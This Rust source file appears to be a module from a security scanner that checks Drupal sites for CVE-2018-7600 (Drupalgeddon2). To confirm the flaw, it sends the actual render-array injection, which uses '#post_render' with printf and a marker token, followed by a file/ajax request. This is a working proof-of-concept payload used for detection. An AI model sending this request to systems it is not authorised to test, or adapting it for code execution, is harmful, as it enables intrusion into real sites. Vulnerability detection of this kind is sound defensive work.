use crate::{
    modules::{HttpFinding, HttpModule, Module},
    Error,
};
use async_trait::async_trait;
use regex::Regex;
use reqwest::Client;

// HTTP Module to identify CVE2018-7600 vulnerabilty
// CVE2018-7600 - Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote 
// attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations

pub struct Cve2018_7600 {
    form_regex: Regex,
}

impl Cve2018_7600 {
    pub fn new() -> Self {
        Cve2018_7600 {
            form_regex: Regex::new(
                r#"<input type="hidden" name="form_build_id" value="([^"]+)" />"#,
            )
            .expect("http/cve_2018_7600: compiling regexp"),
        }
    }
}

impl Module for Cve2018_7600 {
    fn name(&self) -> String {
        String::from("http/cve_2018_7600")
    }

    fn description(&self) -> String {
        String::from("Check for CVE-2018-7600 (a.k.a. Drupalgeddon2)")
    }
}

#[async_trait]
impl HttpModule for Cve2018_7600 {
    async fn scan(
        &self,
        http_client: &Client,
        endpoint: &str,
    ) -> Result<Option<HttpFinding>, Error> {
        let token = "08d15a4aef553492d8971cdd5198f31408d15a4aef553492d8971cdd5198f314";

        let form = [
            ("form_id", "user_pass"),
            ("_triggering_element_name", "name"),
        ];
        let query_params = [
            ("name[#type]", "markup"),
            ("name[#markup]", &(token.clone())),
            ("name[#post_render][]", "printf"),
            ("q", "user/password"),
        ];

        let url = format!("{}/", endpoint);
        let res = http_client
            .post(&url)
            .query(&query_params)
            .form(&form)
            .send()
            .await?;

        let body = res.text().await?;

        if let Some(matchs) = self.form_regex.captures(&body) {
            if matchs.len() > 1 {
                let form_id = &matchs[1];

                let form = [("form_build_id", form_id)];
                let query_params = [("q", format!("file/ajax/name/#value/{}", form_id))];
                let res = http_client
                    .post(&url)
                    .query(&query_params)
                    .form(&form)
                    .send()
                    .await?;

                let body = res.text().await?;

                if body.contains(&token) {
                    return Ok(Some(HttpFinding::Cve2018_7600(url)));
                }
            }
        }

        Ok(None)
    }
}